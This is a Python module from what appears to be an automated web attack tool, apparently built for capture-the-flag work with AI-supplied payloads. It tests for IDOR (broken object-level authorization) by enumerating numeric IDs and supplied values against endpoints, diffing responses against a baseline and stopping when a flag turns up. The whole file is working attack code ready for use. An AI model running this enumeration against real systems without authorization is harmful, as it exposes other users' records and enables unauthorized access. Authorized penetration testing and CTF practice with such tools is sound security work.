"""
IDOR / Broken Object Level Authorization attack module.
Tests numeric ID enumeration, UUID guessing, and horizontal privilege escalation.
"""
from __future__ import annotations
from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag, extract_interesting_data
from rich.console import Console
import re

console = Console()

ID_PARAM_HINTS = ["id", "user_id", "uid", "account", "profile", "order",
                  "item", "document", "file_id", "record", "post", "comment",
                  "message", "ticket", "invoice", "report"]

NUMERIC_ID_RE = re.compile(r"/(\d+)(?:/|$|\?)")


class IDORAttack(BaseAttack):
    name = "idor"

    async def _get_baseline(self, url: str, method: str, param: str | None) -> tuple[int, str]:
        try:
            if param:
                response = await self._try_payload(method, url, param, "1")
                if response[0]:
                    return response[0].status_code, response[0].text
            response = await self.session.get(url, timeout=10.0)
            return response.status_code, response.text
        except Exception:
            return 0, ""

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param", "")
        method = attack_point.get("method", "GET")

        is_id_param = param and any(hint in param.lower() for hint in ID_PARAM_HINTS)
        has_numeric_id = bool(NUMERIC_ID_RE.search(url))

        if not is_id_param and not has_numeric_id:
            return []

        console.print(f"  [cyan][IDOR][/cyan] {method} {url} ?{param}")
        all_findings = []

        baseline_status, baseline_body = await self._get_baseline(url, method, param)

        # Numeric IDs + skill/AI-supplied values (UUIDs, admin IDs, etc.)
        numeric_ids = [str(i) for i in list(range(1, 11)) + [0, -1, 100, 1000, 9999]]
        extra_ids = [p for p in (payloads or []) if p not in numeric_ids]
        all_test_ids = numeric_ids + extra_ids

        for test_id in all_test_ids:
            if self._should_stop():
                break

            if has_numeric_id and not is_id_param:
                test_url = NUMERIC_ID_RE.sub(f"/{test_id}/", url, count=1)
                if test_url == url:
                    test_url = url.rstrip("/") + f"/{test_id}"
                try:
                    response = await self.session.get(test_url, timeout=10.0)
                except Exception:
                    continue
            else:
                response, _ = await self._try_payload(method, url, param, test_id)
                if response is None:
                    continue

            if response.status_code == 200 and len(response.text) > 50:
                if response.text != baseline_body:
                    findings = extract_interesting_data(response.text)
                    flag = has_definite_flag(findings)

                    console.print(
                        f"  [yellow][IDOR][/yellow] Different response for ID={test_id}: "
                        f"{len(response.text)} chars"
                    )
                    findings.append({
                        "type": "idor_different_response",
                        "value": f"IDOR @ {url} ID={test_id}: {response.text[:200]}",
                        "confidence": 0.7,
                    })
                    all_findings.extend(findings)

                    if flag:
                        console.print(f"  [bold green][IDOR][/bold green] FLAG: {flag}")
                        self.stop_event.set()
                        return all_findings

                    break  # First different response per endpoint is enough

        return all_findings
